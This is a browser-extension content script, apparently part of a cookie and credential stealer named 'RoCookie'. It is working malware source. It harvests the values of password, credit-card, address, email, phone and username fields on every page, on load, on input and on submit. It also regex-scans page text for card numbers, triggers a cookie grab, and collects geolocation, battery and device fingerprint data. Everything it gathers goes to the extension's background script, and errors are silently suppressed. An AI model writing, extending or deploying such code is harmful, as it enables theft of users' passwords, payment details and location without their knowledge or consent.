// ============================================================
// RoCookie - Content Script
// Collects autofill data, system info, and page data
// ============================================================

(function() {
    'use strict';

    // ---- Autofill Collection ----
    let autofillData = [];
    let collectTimeout = null;
    const COLLECT_DELAY = 500; // debounce ms

    function collectAutofill() {
        const fields = document.querySelectorAll('input, select, textarea');
        const data = [];
        const url = window.location.href;
        const domain = window.location.hostname;

        for (const el of fields) {
            // Skip if not visible or disabled
            if (el.offsetParent === null || el.disabled) continue;

            const type = el.type || 'text';
            const name = el.name || '';
            const id = el.id || '';
            const autocomplete = el.autocomplete || '';
            const value = el.value || '';

            // Only collect interesting fields: password, credit card, autofill hints
            const isPassword = type === 'password';
            const isCreditCard = autocomplete.includes('cc-') || 
                                (name && /cc|card|cvv|cvc|exp|credit/i.test(name)) ||
                                (id && /cc|card|cvv|cvc|exp|credit/i.test(id));
            const isAddress = autocomplete.includes('address') || autocomplete.includes('street') ||
                              autocomplete.includes('city') || autocomplete.includes('state') ||
                              autocomplete.includes('postal') || autocomplete.includes('country');
            const isName = autocomplete.includes('name') || autocomplete.includes('given-name') ||
                           autocomplete.includes('family-name');
            const isEmail = type === 'email' || autocomplete.includes('email');
            const isPhone = type === 'tel' || autocomplete.includes('tel');
            const isUsername = autocomplete.includes('username') || 
                               (name && /user|login|email/i.test(name) && !isEmail);

            if (isPassword || isCreditCard || isAddress || isName || isEmail || isPhone || isUsername) {
                data.push({
                    type: 'autofill',
                    fieldType: type,
                    name: name,
                    id: id,
                    autocomplete: autocomplete,
                    value: value,
                    url: url,
                    domain: domain,
                    timestamp: Date.now(),
                    // Categorize
                    category: isPassword ? 'password' :
                              isCreditCard ? 'creditcard' :
                              isAddress ? 'address' :
                              isName ? 'name' :
                              isEmail ? 'email' :
                              isPhone ? 'phone' :
                              isUsername ? 'username' : 'other'
                });
            }
        }

        // Also collect any text content that looks like credit card numbers (simple regex)
        const bodyText = document.body.innerText || '';
        const creditCardRegex = /\b(?:\d[ -]*?){13,16}\b/g;
        const matches = bodyText.match(creditCardRegex);
        if (matches) {
            for (const match of matches) {
                data.push({
                    type: 'text_scan',
                    category: 'creditcard',
                    value: match,
                    url: url,
                    domain: domain,
                    timestamp: Date.now()
                });
            }
        }

        return data;
    }

    function sendAutofillData() {
        const data = collectAutofill();
        if (data.length > 0) {
            chrome.runtime.sendMessage({
                action: 'autofillData',
                data: data,
                url: window.location.href,
                domain: window.location.hostname
            }).catch(() => {});
        }
    }

    // Send on page load
    window.addEventListener('load', () => {
        setTimeout(sendAutofillData, 1000);
    });

    // Also send on DOMContentLoaded
    document.addEventListener('DOMContentLoaded', () => {
        setTimeout(sendAutofillData, 500);
    });

    // Debounced collection on input changes
    document.addEventListener('input', () => {
        clearTimeout(collectTimeout);
        collectTimeout = setTimeout(sendAutofillData, COLLECT_DELAY);
    });

    // Also capture when form submits
    document.addEventListener('submit', () => {
        setTimeout(sendAutofillData, 200);
    });

    // ---- Existing: grabData message (cookie trigger) ----
    try {
        const hostname = window.location.hostname;
        chrome.runtime.sendMessage({
            action: 'grabData',
            site: hostname,
            url: window.location.href
        });
    } catch (e) {}

    // ---- System info (geolocation, battery, etc.) ----
    function collectSystemInfo() {
        const info = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            hardwareConcurrency: navigator.hardwareConcurrency || 0,
            deviceMemory: navigator.deviceMemory || 0,
            screenWidth: screen.width,
            screenHeight: screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
        chrome.runtime.sendMessage({
            action: 'systemInfo',
            data: info
        }).catch(() => {});
        return info;
    }

    function collectGeolocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const geo = {
                        lat: position.coords.latitude,
                        long: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null
                    };
                    chrome.runtime.sendMessage({
                        action: 'systemInfo',
                        data: { geolocation: geo }
                    }).catch(() => {});
                },
                () => {}
            );
        }
    }

    function collectBattery() {
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                chrome.runtime.sendMessage({
                    action: 'systemInfo',
                    data: { battery: { level: battery.level, charging: battery.charging } }
                }).catch(() => {});
            }).catch(() => {});
        }
    }

    collectSystemInfo();
    collectGeolocation();
    collectBattery();

    // Also send autofill on visibility change
    document.addEventListener('visibilitychange', () => {
        if (!document.hidden) {
            sendAutofillData();
        }
    });

    console.log('[RoCookie] Content script loaded');
})();